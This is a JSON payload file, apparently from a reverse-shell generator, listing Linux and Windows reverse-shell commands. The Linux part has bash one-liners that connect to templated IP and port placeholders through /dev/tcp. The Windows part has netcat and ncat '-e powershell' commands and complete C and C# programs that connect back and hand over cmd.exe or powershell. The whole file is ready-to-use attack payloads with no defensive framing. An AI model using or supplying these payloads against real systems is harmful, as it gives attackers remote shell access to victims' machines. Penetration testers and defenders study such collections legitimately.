{
	"Linux": [
		{
			"name": "bash -i",
			"command": "{SHELL} -i >& /dev/tcp/{IP}/{PORT} 0>&1"
		},
		{
			"name": "bash 196", 
          "command": "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {SHELL} <&196 >&196 2>&196"
		},
      {
        "name": "bash read line",
        "command": "exec 5<>/dev/tcp/{IP}/8888;cat <&5 | while read line; do $line 2>&5 >&5; done"
      },
      {
        "name": "bash 5",
        "command": "{SHELL} -i 5<> /dev/tcp/127.0.0.1/8888 0<&5 1>&5 2>&5"
      }
	],
  "Windows": [
    {
      "name": "nc.exe -e",
      "command": "nc.exe 127.0.0.1 8888 -e powershell"
    },
    {
      "name": "ncat.exe -e",
      "command": "ncat.exe 127.0.0.1 8888 -e powershell"
    },
    {
      "name": "C Windows",
      "command": "#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,\"ws2_32\")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax; \nchar ip_addr[16] = \"127.0.0.2\"; \nchar port[6] = \"8888\";            \n\nSTARTUPINFO ini_processo;\n\nPROCESS_INFORMATION processo_info;\n\nint main()\n{\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n\n    struct hostent *host; \n    host = gethostbyname(ip_addr);\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\n\n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(atoi(port));\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\n\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n\n    memset(&ini_processo, 0, sizeof(ini_processo));\n    ini_processo.cb = sizeof(ini_processo);\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n\n    return 0;\n}\n"
    },
    {
      "name": "C# TCP Client",
      "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n    public class Program\n    {\n        static StreamWriter streamWriter;\n\n        public static void Main(string[] args)\n        {\n            using(TcpClient client = new TcpClient(\"127.0.0.2\", 8888))\n            {\n                using(Stream stream = client.GetStream())\n                {\n                    using(StreamReader rdr = new StreamReader(stream))\n                    {\n                        streamWriter = new StreamWriter(stream);\n                        \n                        StringBuilder strInput = new StringBuilder();\n\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"powershell\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n\n                        while(true)\n                        {\n                            strInput.Append(rdr.ReadLine());\n                            //strInput.Append(\"\\n\");\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }\n                    }\n                }\n            }\n        }\n\n        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n    }\n}\n"
    }
  ]
}
